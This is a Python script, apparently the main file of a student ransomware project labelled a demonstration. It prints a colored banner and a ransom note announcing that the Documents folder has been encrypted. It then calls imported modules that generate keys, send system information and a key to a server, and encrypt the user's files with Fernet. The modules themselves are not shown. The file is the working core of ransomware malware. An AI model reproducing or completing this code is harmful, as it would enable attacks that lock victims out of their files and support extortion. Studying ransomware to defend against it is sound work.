from colorama import Fore,Style
from cryptography.fernet import Fernet
import random
import client_key_sender
import encryptor

def colored_ransom(text):
    for char in text:
        if char == '\n':
            print()
        elif char == ' ':
            print(' ', end='')
        else:
            foreground_colors = [Fore.RED, Fore.YELLOW]#, Fore.WHITE]
            foreground_color = random.choice(foreground_colors)
            
            colored_char = f"{foreground_color}{char}{Style.RESET_ALL}"
            print(colored_char, end='')

colored_ransom("""
  
██╗  ██╗██████╗ ██╗   ██╗██████╗ ████████╗ ██████╗ ███████╗
██║ ██╔╝██╔══██╗╚██╗ ██╔╝██╔══██╗╚══██╔══╝██╔═══██╗██╔════╝
█████╔╝ ██████╔╝ ╚████╔╝ ██████╔╝   ██║   ██║   ██║███████╗
██╔═██╗ ██╔══██╗  ╚██╔╝  ██╔═══╝    ██║   ██║   ██║╚════██║
██║  ██╗██║  ██║   ██║   ██║        ██║   ╚██████╔╝███████║
╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝        ╚═╝    ╚═════╝ ╚══════╝ 
""")
print("""
                                                            Omar @ CMC IDOCS 201 2023/2024                                                                                                                 
""")

print(Fore.MAGENTA,"""
*-----* Oops! Ransomware *-----*

Your files located at Documents directory have been encrypted!

""", Fore.RESET)

print(Fore.GREEN ,"""
This is just a demonstration of how ransomware works.
""", Fore.RESET)
print("""
To decrypt your files, follow these simple steps:

1. Get the the private key from the server.
2. Run the decryption script named 'decryptor.py'.
3. Enter the path to the private key.


This demonstration is a part of my ransomware project.

""")
client_key_sender.keygen()
client_key_sender.sending_info()
client_key_sender.sending_key()

key=Fernet.generate_key()

encryptor.rand_key_save(key)
encryptor.key_encryptor(key)
encryptor.file_encryptor(key)

to_quit=input('Type "quit" to close the program: ')
while to_quit != "quit":
    print("""
To decrypt your files, follow these simple steps:

1. Get the the private key from the server.
2. Run the decryption script named 'decryptor.py'.
3. Enter the path to the private key.


This demonstration is a part of my ransomware project.

""")
    to_quit=input('Type "quit" to close the program: ')